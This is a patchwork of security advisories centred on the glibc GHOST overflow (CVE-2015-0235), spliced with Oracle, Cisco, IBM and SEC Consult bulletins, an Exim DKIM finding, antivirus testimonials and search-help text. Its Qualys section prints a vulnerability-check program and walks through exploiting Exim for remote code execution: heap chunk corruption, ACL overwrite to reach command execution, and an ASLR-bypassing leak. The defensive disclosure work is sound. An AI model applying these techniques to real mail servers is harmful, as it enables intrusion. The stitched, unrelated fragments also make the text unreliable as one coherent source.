 827       {
 ...
 829       }
 830     else
 831       {
 ...
 838       sig->verify_status     = PDKIM_VERIFY_FAIL;
 839       sig->verify_ext_status = PDKIM_VERIFY_FAIL_BODY;
 840       }
 841   }
 842 }
------------------------------------------------------------------------

Unfortunately, at line 826, sig->bodyhash.data is attacker-controlled
(through a "DKIM-Signature:" mail header) and memcmp() is called without
checking first that sig->bodyhash.len is equal to b->bh.len: memcmp()
can read sig->bodyhash.data out-of-bounds.

If the acl_smtp_dkim is set (it is unset by default), an unauthenticated
remote attacker may transform this vulnerability into an information
disclosure; we have not fully explored this possibility.

# Oracle Critical Patch Update Advisory - October 2015

## Oracle Critical Patch Update Advisory - October 2015

### Description

A Critical Patch Update (CPU) is a collection of patches for multiple security vulnerabilities. Critical Patch Update patches are usually cumulative, but each advisory describes only the security fixes added since the previous Critical Patch Update advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security fixes. Please refer to: [Critical Patch Updates and Security Alerts](/security-alerts/) for information about Oracle Security Advisories.

**Oracle continues to periodically receive reports of malicious exploitation of vulnerabilities for which Oracle has already released fixes. In some instances, it has been reported that malicious attackers have been successful because customers had failed to apply available Oracle patches. Oracle therefore *strongly* recommends that customers remain on actively-supported versions and apply Critical Patch Update fixes *without* delay.**

This Critical Patch Update contains 270 new security fixes across the product families listed below. Please note that a blog entry summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at [https://blogs.oracle.com/security](//blogs.oracle.com/security).

This Critical Patch Update advisory is also available in an XML format that conforms to the Common Vulnerability Reporting Format (CVRF) version 1.1. More information about Oracle's use of CVRF is available at: [http://www.oracle.com/security-alerts/cpufaq.html#CVRF](/security-alerts/cpufaq.html#CVRF).

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly fixed by the patches associated with this advisory. Risk matrices for previous security fixes can be found in  [previous Critical Patch Update advisories](/security-alerts/). An English text version of the risk matrices provided in this document is available  [here](/security-alerts/cpuoct2015verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](//cve.mitre.org/) which is a unique identifier for a vulnerability. A vulnerability that affects multiple products will appear with the same **CVE#** in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 2.0 (see  [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS 2.0). Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update (CPU). Oracle does not disclose information about the security analysis, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/corporate/security-practices/assurance/vulnerability/disclosure.html) .

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply CPU fixes as soon as possible**. Until you apply the CPU fixes, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security fixes as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security fixes announced in this CPU, please review previous  [Critical Patch Update advisories](/security-alerts/) to determine appropriate actions.

### Product Dependencies

Oracle products may have dependencies on other Oracle products. Hence security vulnerability fixes announced in this Critical Patch Update may affect one or more dependent Oracle products. For details regarding these dependencies and how to apply patches to dependent products, please refer to Patch Set Update and Critical Patch Update October 2015 Availability Document,  [My Oracle Support Note 2037108.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=2037108.1).

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the [Lifetime Support Policy](//www.oracle.com/support/lifetime-support/). We recommend that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Supported Database, Fusion Middleware, Oracle Enterprise Manager Base Platform (formerly "Oracle Enterprise Manager Grid Control") and Collaboration Suite products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/epmos/faces/DocumentDisplay?id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/support/policies.html) for further guidelines regarding support policies and phases of support.

### Products in Extended Support

Patches released through the Critical Patch Update program are available to customers who have Extended Support under the [Lifetime Support Policy](//www.oracle.com/support/lifetime-support/). Customers must have a valid Extended Support service contract to download patches released through the Critical Patch Update program for products in the Extended Support Phase.

### Appendix - Oracle Java SE

#### Oracle Java SE Executive Summary

This Critical Patch Update contains 25 new security fixes for Oracle Java SE. 24 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without the need for a username and password. The English text form of this Risk Matrix can be found  [here](/security-alerts/cpuoct2015verbose.html#JAVA).

The CVSS scores below assume that a user running a Java applet or Java Web Start application has administrator privileges (typical on Windows). When the user does not run with administrator privileges (typical on Solaris and Linux), the corresponding CVSS impact scores for Confidentiality, Integrity, and Availability are "Partial" instead of "Complete", lowering the CVSS Base Score. For example, a Base Score of 10.0 becomes 7.5.

Users should only use the default Java Plug-in and Java Web Start from the latest JDK or JRE 7 and 8 releases.

Qualys Security Advisory CVE-2015-0235

GHOST: glibc gethostbyname buffer overflow

--[ Contents ]----------------------------------------------------------------

1 - Summary
2 - Analysis
3 - Mitigating factors
4 - Case studies
5 - Exploitation
6 - Acknowledgments

--[ 1 - Summary ]-------------------------------------------------------------

During a code audit performed internally at Qualys, we discovered a
buffer overflow in the __nss_hostname_digits_dots() function of the GNU
C Library (glibc). This bug is reachable both locally and remotely via
the gethostbyname*() functions, so we decided to analyze it -- and its
impact -- thoroughly, and named this vulnerability "GHOST".

Our main conclusions are:

- Via gethostbyname() or gethostbyname2(), the overflowed buffer is
  located in the heap. Via gethostbyname_r() or gethostbyname2_r(), the
  overflowed buffer is caller-supplied (and may therefore be located in
  the heap, stack, .data, .bss, etc; however, we have seen no such call
  in practice).

- At most sizeof(char *) bytes can be overwritten (ie, 4 bytes on 32-bit
  machines, and 8 bytes on 64-bit machines). Bytes can be overwritten
  only with digits ('0'...'9'), dots ('.'), and a terminating null
  character ('\0').

- Despite these limitations, arbitrary code execution can be achieved.
  As a proof of concept, we developed a full-fledged remote exploit
  against the Exim mail server, bypassing all existing protections
  (ASLR, PIE, and NX) on both 32-bit and 64-bit machines. We will
  publish our exploit as a Metasploit module in the near future.

- The first vulnerable version of the GNU C Library is glibc-2.2,
  released on November 10, 2000.

- We identified a number of factors that mitigate the impact of this
  bug. In particular, we discovered that it was fixed on May 21, 2013
  (between the releases of glibc-2.17 and glibc-2.18). Unfortunately, it
  was not recognized as a security threat; as a result, most stable and
  long-term-support distributions were left exposed (and still are):
  Debian 7 (wheezy), Red Hat Enterprise Linux 6 & 7, CentOS 6 & 7,
  Ubuntu 12.04, for example.

--[ 2 - Analysis ]------------------------------------------------------------

The vulnerable function, __nss_hostname_digits_dots(), is called
internally by the glibc in nss/getXXbyYY.c (the non-reentrant version)
and nss/getXXbyYY_r.c (the reentrant version). However, the calls are
surrounded by #ifdef HANDLE_DIGITS_DOTS, a macro defined only in:

- inet/gethstbynm.c
- inet/gethstbynm2.c
- inet/gethstbynm_r.c
- inet/gethstbynm2_r.c
- nscd/gethstbynm3_r.c

These files implement the gethostbyname*() family, and hence the only
way to reach __nss_hostname_digits_dots() and its buffer overflow. The
purpose of this function is to avoid expensive DNS lookups if the
hostname argument is already an IPv4 or IPv6 address.

The code below comes from glibc-2.17:

 35 int
 36 __nss_hostname_digits_dots (const char *name, struct hostent *resbuf,
 37                             char **buffer, size_t *buffer_size,

 86                      + sizeof (*h_addr_ptrs) + strlen (name) + 1);
 87
 88       if (buffer_size == NULL)
 89         {

 91             {

 96             }
 97         }
 98       else if (buffer_size != NULL && *buffer_size < size_needed)
 99         {
100           char *new_buf;
101           *buffer_size = size_needed;
102           new_buf = (char *) realloc (*buffer, *buffer_size);

117         }

121       host_addr = (host_addr_t *) *buffer;
122       h_addr_ptrs = (host_addr_list_t *)
123         ((char *) host_addr + sizeof (*host_addr));
124       h_alias_ptr = (char **) ((char *) h_addr_ptrs + sizeof (*h_addr_ptrs));
125       hostname = (char *) h_alias_ptr + sizeof (*h_alias_ptr);
126
127       if (isdigit (name[0]))
128         {

143                     ok = __inet_aton (name, (struct in_addr *) host_addr);
144                   else
145                     {
146                       assert (af == AF_INET6);
147                       ok = inet_pton (af, name, host_addr) > 0;
148                     }
149                   if (! ok)
150                     {
...
154                       goto done;
155                     }
156
157                   resbuf->h_name = strcpy (hostname, name);
...
194                   goto done;
195                 }
196
197               if (!isdigit (*cp) && *cp != '.')
198                 break;
199             }
200         }
...

Lines 85-86 compute the size_needed to store three (3) distinct entities
in buffer: host_addr, h_addr_ptrs, and name (the hostname). Lines 88-117
make sure the buffer is large enough: lines 88-97 correspond to the
reentrant case, lines 98-117 to the non-reentrant case.

Lines 121-125 prepare pointers to store four (4) distinct entities in
buffer: host_addr, h_addr_ptrs, h_alias_ptr, and hostname. The sizeof
(*h_alias_ptr) -- the size of a char pointer -- is missing from the
computation of size_needed.

The strcpy() on line 157 should therefore allow us to write past the end
of buffer, at most (depending on strlen(name) and alignment) 4 bytes on
32-bit machines, or 8 bytes on 64-bit machines. There is a similar
strcpy() after line 200, but no buffer overflow:

236           size_needed = (sizeof (*host_addr)
237                          + sizeof (*h_addr_ptrs) + strlen (name) + 1);
...
267           host_addr = (host_addr_t *) *buffer;
268           h_addr_ptrs = (host_addr_list_t *)
269             ((char *) host_addr + sizeof (*host_addr));
270           hostname = (char *) h_addr_ptrs + sizeof (*h_addr_ptrs);
...
289                   resbuf->h_name = strcpy (hostname, name);

In order to reach the overflow at line 157, the hostname argument must
meet the following requirements:

- Its first character must be a digit (line 127).

- Its last character must not be a dot (line 135).

- It must comprise only digits and dots (line 197) (we call this the
  "digits-and-dots" requirement).

- It must be long enough to overflow the buffer. For example, the
  non-reentrant gethostbyname*() functions initially allocate their
  buffer with a call to malloc(1024) (the "1-KB" requirement).

- It must be successfully parsed as an IPv4 address by inet_aton() (line
  143), or as an IPv6 address by inet_pton() (line 147). Upon careful
  analysis of these two functions, we can further refine this
  "inet-aton" requirement:

  . It is impossible to successfully parse a "digits-and-dots" hostname
    as an IPv6 address with inet_pton() (':' is forbidden). Hence it is
    impossible to reach the overflow with calls to gethostbyname2() or
    gethostbyname2_r() if the address family argument is AF_INET6.

  . Conclusion: inet_aton() is the only option, and the hostname must
    have one of the following forms: "a.b.c.d", "a.b.c", "a.b", or "a",
    where a, b, c, d must be unsigned integers, at most 0xfffffffful,
    converted successfully (ie, no integer overflow) by strtoul() in
    decimal or octal (but not hexadecimal, because 'x' and 'X' are
    forbidden).

--[ 3 - Mitigating factors ]--------------------------------------------------

The impact of this bug is reduced significantly by the following
reasons:

- A patch already exists (since May 21, 2013), and has been applied and
  tested since glibc-2.18, released on August 12, 2013:

        [BZ #15014]
        * nss/getXXbyYY_r.c (INTERNAL (REENTRANT_NAME))
        [HANDLE_DIGITS_DOTS]: Set any_service when digits-dots parsing was
        successful.
        * nss/digits_dots.c (__nss_hostname_digits_dots): Remove
        redundant variable declarations and reallocation of buffer when
        parsing as IPv6 address.  Always set NSS status when called from
        reentrant functions.  Use NETDB_INTERNAL instead of TRY_AGAIN when
        buffer too small.  Correct computation of needed size.
        * nss/Makefile (tests): Add test-digits-dots.
        * nss/test-digits-dots.c: New test.

- The gethostbyname*() functions are obsolete; with the advent of IPv6,
  recent applications use getaddrinfo() instead.

- Many programs, especially SUID binaries reachable locally, use
  gethostbyname() if, and only if, a preliminary call to inet_aton()
  fails. However, a subsequent call must also succeed (the "inet-aton"
  requirement) in order to reach the overflow: this is impossible, and
  such programs are therefore safe.

- Most of the other programs, especially servers reachable remotely, use
  gethostbyname() to perform forward-confirmed reverse DNS (FCrDNS, also
  known as full-circle reverse DNS) checks. These programs are generally
  safe, because the hostname passed to gethostbyname() has normally been
  pre-validated by DNS software:

  . "a string of labels each containing up to 63 8-bit octets, separated
    by dots, and with a maximum total of 255 octets." This makes it
    impossible to satisfy the "1-KB" requirement.

  . Actually, glibc's DNS resolver can produce hostnames of up to
    (almost) 1025 characters (in case of bit-string labels, and special
    or non-printable characters). But this introduces backslashes ('\\')
    and makes it impossible to satisfy the "digits-and-dots"
    requirement.

--[ 4 - Case studies ]--------------------------------------------------------

In this section, we will analyze real-world examples of programs that
call the gethostbyname*() functions, but we first introduce a small test
program that checks whether a system is vulnerable or not:

[user@fedora-19 ~]$ cat > GHOST.c << EOF
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

struct {
  char buffer[1024];
  char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };

int main(void) {
  struct hostent resbuf;
  struct hostent *result;
  int herrno;
  int retval;

  /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
  size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
  char name[sizeof(temp.buffer)];
  memset(name, '0', len);
  name[len] = '\0';

  retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);

  if (strcmp(temp.canary, CANARY) != 0) {
    puts("vulnerable");
    exit(EXIT_SUCCESS);
  }
  if (retval == ERANGE) {
    puts("not vulnerable");
    exit(EXIT_SUCCESS);
  }
  puts("should not happen");
  exit(EXIT_FAILURE);
}
EOF

[user@fedora-19 ~]$ gcc GHOST.c -o GHOST

On Fedora 19 (glibc-2.17):

[user@fedora-19 ~]$ ./GHOST
vulnerable

On Fedora 20 (glibc-2.18):

[user@fedora-20 ~]$ ./GHOST
not vulnerable

----[ 4.1 - The GNU C Library ]-----------------------------------------------

The glibc itself contains a few calls to gethostbyname*() functions. In
particular, getaddrinfo() calls gethostbyname2_r() if, but only if, a
first call to inet_aton() fails: in accordance with the "inet-aton"
requirement, these internal calls are safe. For example,
eglibc-2.13/sysdeps/posix/getaddrinfo.c:

      at->family = AF_UNSPEC;
      ...
      if (__inet_aton (name, (struct in_addr *) at->addr) != 0)
        {
          if (req->ai_family == AF_UNSPEC || req->ai_family == AF_INET)
            at->family = AF_INET;
          else if (req->ai_family == AF_INET6 && (req->ai_flags & AI_V4MAPPED))
            {
              ...
              at->family = AF_INET6;
            }
          else
            return -EAI_ADDRFAMILY;
          ...
        }
      ...
      if (at->family == AF_UNSPEC && (req->ai_flags & AI_NUMERICHOST) == 0)
        {
          ...
              size_t tmpbuflen = 512;
              char *tmpbuf = alloca (tmpbuflen);
              ...
                  rc = __gethostbyname2_r (name, family, &th, tmpbuf,
                                           tmpbuflen, &h, &herrno);
          ...
        }

----[ 4.2 - mount.nfs ]-------------------------------------------------------

Similarly, mount.nfs (a SUID-root binary) is not vulnerable:

        if (inet_aton(hostname, &addr->sin_addr))
                return 0;
        if ((hp = gethostbyname(hostname)) == NULL) {
                nfs_error(_("%s: can't get address for %s\n"),
                                progname, hostname);
                return -1;
        }

----[ 4.3 - mtr ]-------------------------------------------------------------

mtr (another SUID-root binary) is not vulnerable either, because it
calls getaddrinfo() instead of gethostbyname*() functions on any modern
(ie, IPv6-enabled) system:

#ifdef ENABLE_IPV6
  /* gethostbyname2() is deprecated so we'll use getaddrinfo() instead. */
  ...
  error = getaddrinfo( Hostname, NULL, &hints, &res );
  if ( error ) {
    if (error == EAI_SYSTEM)
       perror ("Failed to resolve host");
    else
       fprintf (stderr, "Failed to resolve host: %s\n", gai_strerror(error));
    exit( EXIT_FAILURE );
  }
  ...
#else
    host = gethostbyname(Hostname);
  if (host == NULL) {
    herror("mtr gethostbyname");
    exit(1);
  }
  ...
#endif

----[ 4.4 - iputils ]---------------------------------------------------------

------[ 4.4.1 - clockdiff ]---------------------------------------------------

clockdiff is vulnerable in a straightforward manner:

        hp = gethostbyname(argv[1]);
        if (hp == NULL) {
                fprintf(stderr, "clockdiff: %s: host not found\n", argv[1]);
                exit(1);
        }

------[ 4.4.2 - ping and arping ]---------------------------------------------

ping and arping call gethostbyname() and gethostbyname2(), respectively,
if and only if inet_aton() fails first. This time, however, there is
another function call in between (Fedora, for example, does define
USE_IDN):

--------[ 4.4.2.1 - ping ]----------------------------------------------------

                if (inet_aton(target, &whereto.sin_addr) == 1) {
                        ...
                } else {
                        char *idn;
#ifdef USE_IDN
                        int rc;
                        ...
                        rc = idna_to_ascii_lz(target, &idn, 0);
                        if (rc != IDNA_SUCCESS) {
                                fprintf(stderr, "ping: IDN encoding failed: %s\n", idna_strerror(rc));
                                exit(2);
                        }
#else
                        idn = target;
#endif
                        hp = gethostbyname(idn);

--------[ 4.4.2.2 - arping ]--------------------------------------------------

        if (inet_aton(target, &dst) != 1) {
                struct hostent *hp;
                char *idn = target;
#ifdef USE_IDN
                int rc;

                rc = idna_to_ascii_lz(target, &idn, 0);

                if (rc != IDNA_SUCCESS) {
                        fprintf(stderr, "arping: IDN encoding failed: %s\n", idna_strerror(rc));
                        exit(2);
                }
#endif

                hp = gethostbyname2(idn, AF_INET);

--------[ 4.4.2.3 - Analysis ]------------------------------------------------

If idna_to_ascii_lz() modifies the target hostname, the first call to
inet_aton() could fail and the second call (internal to gethostbyname())
could succeed. For example, idna_to_ascii_lz() transforms any Unicode
dot-like character (0x3002, 0xFF0E, 0xFF61) into an ASCII dot (".").

But it also restricts the length of a domain label to 63 characters:
this makes it impossible to reach 1024 bytes (the "1-KB" requirement)
with only 4 labels and 3 dots (the "inet-aton" requirement).

Unless inet_aton() (actually, strtoul()) can be tricked into accepting
more than 3 dots? Indeed, idna_to_ascii_lz() does not restrict the total
length of a domain name. glibc supports "thousands' grouping characters"
(man 3 printf); for example, sscanf(str, "%'lu", &ul) yields 1000 when
processing any of the following input strings:

- "1,000" in an English locale;
- "1 000" in a French locale; and
- "1.000" in a German or Spanish locale.

strtoul() implements this "number grouping" too, but its use is limited
to internal glibc functions. Conclusion: more than 3 dots is impossible,
and neither ping nor arping is vulnerable.

----[ 4.5 - procmail ]--------------------------------------------------------

procmail (a SUID-root and SGID-mail binary) is vulnerable through its
"comsat/biff" feature:

#define COMSAThost      "localhost"    /* where the biff/comsat daemon lives */
...
#define SERV_ADDRsep    '@'           /* when overriding in COMSAT=serv@addr */

int setcomsat(chp)const char*chp;
{ char*chad; ...
  chad=strchr(chp,SERV_ADDRsep);                             /* @ separator? */
  ...
  if(chad)
     *chad++='\0';                                    /* split the specifier */

----[ 4.6 - pppd ]------------------------------------------------------------

pppd (yet another SUID-root binary) calls gethostbyname() if a
preliminary call to inet_addr() (a simple wrapper around inet_aton())
fails. "The inet_addr() function converts the Internet host address cp
from IPv4 numbers-and-dots notation into binary data in network byte
order. If the input is invalid, INADDR_NONE (usually -1) is returned.
Use of this function is problematic because -1 is a valid address
(255.255.255.255)." A failure for inet_addr(), but a success for
inet_aton(), and consequently a path to the buffer overflow.

--[ 5 - Exploitation ]--------------------------------------------------------

----[ 5.1 - Code execution ]--------------------------------------------------

In this section, we describe how we achieve remote code execution
against the Exim SMTP mail server, bypassing the NX (No-eXecute)
protection and glibc's malloc hardening.

First, we overflow gethostbyname's heap-based buffer and partially
overwrite the size field of the next contiguous free chunk of memory
with a slightly larger size (we overwrite only 3 bytes of the size
field; in any case, we cannot overflow more than 4 bytes on 32-bit
machines, or 8 bytes on 64-bit machines):

                            |< malloc_chunk
                            |
-----|----------------------|---+--------------------|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| free chunk | ...
-----|----------------------|---+--------------------|-----
     |                         X|
     |------------------------->|
               overflow

where:

struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};

and: X marks the spot where the crucial memory corruption takes place.

As a result, this artificially-enlarged free chunk, which is managed by
glibc's malloc, overlaps another block of memory, Exim's current_block,
which is managed by Exim's internal memory allocator:

                            |< malloc_chunk          |< storeblock
                            |                        |
-----|----------------------|------------------------|---------------+---|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| free chunk |n|l| current_block | ...
-----|----------------------|------------------------|---------------+---|-----
                            |                                        |
                            |<-------------------------------------->|
                                 artificially enlarged free chunk

where:

typedef struct storeblock {
  struct storeblock *next;
  size_t length;
} storeblock;

Then, we partially allocate the enlarged free chunk and overwrite the
beginning of Exim's current_block of memory (the "storeblock" structure)
with arbitrary data. In particular, we overwrite its "next" field:

                            |< malloc_chunk          |< storeblock
                            |                        |
-----|----------------------|------------------------|--------+----------|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| aaaaaaaaaa |n|l| current_block | ...
-----|----------------------|------------------------|--------+----------|-----
                            |                         X       |
                            |<------------------------------->|
                                      allocated chunk

This effectively turns gethostbyname's buffer overflow into a
write-anything-anywhere primitive, because we control both the pointer
to the next block of memory returned by Exim's allocator (the hijacked
"next" pointer) and the data allocated (a null-terminated string, the
argument of an SMTP command we send to Exim).

Finally, we use this write-anything-anywhere primitive to overwrite
Exim's run-time configuration, which is cached in the heap memory. More
precisely, we overwrite Exim's Access Control Lists (ACLs), and achieve
arbitrary command execution thanks to Exim's "${run{<command> <args>}}"
string expansion mechanism:

                                                     |< storeblock
                                                     |

          |<------------------->|
             new current_block

----[ 5.2 - Information leak ]------------------------------------------------

The success of this exploit depends on an important piece of
information: the address of Exim's run-time configuration in the heap.
In this section, we describe how we obtain this address, bypassing the
ASLR (Address Space Layout Randomization) and PIE (Position Independent
Executable) protections.

First, we overflow gethostbyname's heap-based buffer and partially
overwrite the size field of the next contiguous free chunk of memory
with a slightly larger size:

                            |< malloc_chunk
                            |
-----|----------------------|---+-------------------------|-----
 ... | gethostbyname buffer |p|s|f|b|F|B| next free chunk | ...

     |                         X|
     |------------------------->|
               overflow

As a result, this artificially-enlarged free chunk overlaps another
block of memory, where Exim saves the error message "503 sender not yet
given\r\n" for later use:

                            |< malloc_chunk
                            |

 ... | gethostbyname buffer |p|s|f|b|F|B| real free chunk | error message | ...
-----|----------------------|-----------------------------|----------+----|-----
                            |                                        |
                            |<-------------------------------------->|
                                 artificially enlarged free chunk

Then, we partially allocate the artificially-enlarged free chunk,
thereby splitting it in two: the newly allocated chunk, and a smaller,
free chunk (the remainder from the split). The malloc_chunk header for
this remaining free chunk overwrites the very beginning of the saved
error message with a pointer to the heap (the fd_nextsize pointer):

                            |< malloc_chunk       |< malloc_chunk
                            |                     |

                            |                     |        X         |
                            |<------------------->|<---------------->|
                                allocated chunk        free chunk

Finally, we send an invalid SMTP command to Exim, and retrieve the
fd_nextsize heap pointer from Exim's SMTP response, which includes the
corrupted error message. This effectively turns gethostbyname's buffer
overflow into an information leak; moreover, it allows us to distinguish
between 32-bit and 64-bit machines.

This vulnerability is related to the various gethostbyname functions included in glibc and affects applications that call these functions. This vulnerability may allow an attacker to obtain sensitive information from an exploited system or, in some instances, perform remote code execution with the privileges of the application being exploited.      The glibc library is a commonly used third-party software component that is released by the GNU software project and a number of Cisco products are likely affected.      This advisory will be updated as additional information becomes available. Cisco will release free software updates that address this vulnerability. Workarounds that mitigate this vulnerability are not available.

Details  * A buffer overflow was found in the GNU C library's (glibc) *\_\_nss\_hostname\_digits\_dots()* function, which, in turn, is used by the *gethostbyname()*, *gethostbyname2()*, and other glibc function calls. The vulnerable code in the affected functions is designed to prevent DNS lookups for addresses that do not need to be resolved (i.e. they are already IPv4 or IPv6 addresses). These vulnerable functions are commonly used by networking applications.      Systems that contain glibc versions 2.2 to 2.17 are affected by this vulnerability. Applications that statically link to an affected version are also affected by this vulnerability.      The impact of this vulnerability varies based on hardware and software configurations. A remote, unauthenticated attacker that is able to provide a hostname to an application that is using an affected function may be able to exploit this vulnerability to obtain sensitive information from memory or perform remote code execution with the same privileges as the process or application being exploited.      This vulnerability has been assigned the Common Vulnerabilities and Exposures (CVE) ID CVE-2015-0235.      More information provided for each bug ID listed in the "Vulnerable Products" section of this advisory can be found in the [Cisco Bug Search Tool](https://bst.cloudapps.cisco.com/bugsearch/ "Bug Search Tool").  Workarounds  * There are currently no network-based mitigations for this vulnerability or any mitigations that can be performed directly on affected systems.      Cisco has published an Event Response for this vulnerability: <http://www.cisco.com/web/about/security/intelligence/ERP_GHOST_29-Jan-2015.html>  Fixed Software  * When considering software upgrades, customers are advised to consult the Cisco Security Advisories, Responses, and Notices archive at <http://www.cisco.com/go/psirt> and review subsequent advisories to determine exposure and a complete upgrade solution.      In all cases, customers should ensure that the devices to be upgraded contain sufficient memory and confirm that current hardware and software configurations will continue to be supported properly by the new release. If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.

To return expected results, you can:

* **Reduce the number of search terms.** Each term you use focuses the search further.
* **Check your spelling.** A single misspelled or incorrectly typed term can change your result.
* **Try substituting synonyms for your original terms.** For example, instead of searching for "java classes", try "java training"

# Security Bulletin: GNU C library (glibc) vulnerability affects WebSphere Transformation Extender with Launcher Hypervisor Edition [for RHEL] (CVE-2015-0235)

### Security Bulletin

## Summary

GNU C library (glibc) vulnerability that has been referred to as GHOST affects WebSphere Transformation Extender with Launcher Hypervisor Edition [for RHEL].

## Vulnerability Details

## Affected Products and Versions

**Product:** WebSphere Transformation Extender with Launcher Hypervisor Edition [for RHEL]

**Versions:**

\* 8.4.0.0 - 8.4.0.5

\* 8.4.1.0 - 8.4.1.2

## Remediation/Fixes

Download and install the [interim fix for APAR PI34228](http://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm~WebSphere&product=ibm/WebSphere/WebSphere+Transformation+Extender&release=All&platform=All&function=aparId&apars=PI34228) from IBM Fix Central.

– F‑Secure Total customer

It just seems to work well in the back­ground and F‑Secure have kept my computers safe for many years.

– F-Secure Internet Security Customer

Works and is reliable, just great!

– F-Secure VPN Customer

It's an easy and safe way to save passwords and protect other personal information.

– F-Secure ID Protection Customer

my computer came with f-secure and im very happy with it! comes with a vpn and lots of other stuff as well

– maria @svnflowerhrry

...so I urge everyone to use a password vault, a fairly cheap one on a cheap yearly price can be obtained from @FSecure. I use it daily on PC and mobile. Includes VPN and virus protection. The other method is to use 2-step authentication. Preferably both. Be safe. Bless you.

– Matti Hirvonen @Hiljaa\_Tulee

Remember to always protect your internet connections. An easy way to do this is to use a trusted and paid VPN service. I recommend @FSecure’s VPN, because it’s made by a cyber security company, whose only purpose is to safe­guard the data and privacy of its customers. #InfoSec

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Source: <https://www.moxa.com/en/about-us/corporate-responsibility>

Business recommendation:
------------------------
SEC Consult recommends to immediately apply the available patches
from the vendor. A thorough security review should be performed by
security professionals to identify further potential security issues.

Vulnerability overview/description:
-----------------------------------
1) Authenticated Command Injection (CVE-2021-39279)
An authenticated command injection vulnerability can be triggered by issuing a
GET request to the "/forms/web_importTFTP" CGI program which is available on
the web interface. An attacker can abuse this vulnerability to compromise the
operating system of the device. This issue was found by emulating the firmware
of the device.

2) Reflected Cross-Site Scripting via Manipulated Config-File (CVE-2021-39278)
Via a crafted config-file, a reflected cross-site scripting vulnerability can
be exploited in the context of the victim's browser. This config-file can be
uploaded to the device via the "Config Import Export" tab in the main menu.

3) Known GNU glibc Vulnerabilities (CVE-2015-0235)
The used GNU glibc in version 2.9 is outdated and contains multiple known
vulnerabilities. One of the discovered vulnerabilities (CVE-2015-0235,
gethostbyname "GHOST" buffer overflow) was verified by using the MEDUSA
scalable firmware runtime.

4) Multiple Outdated Software Components
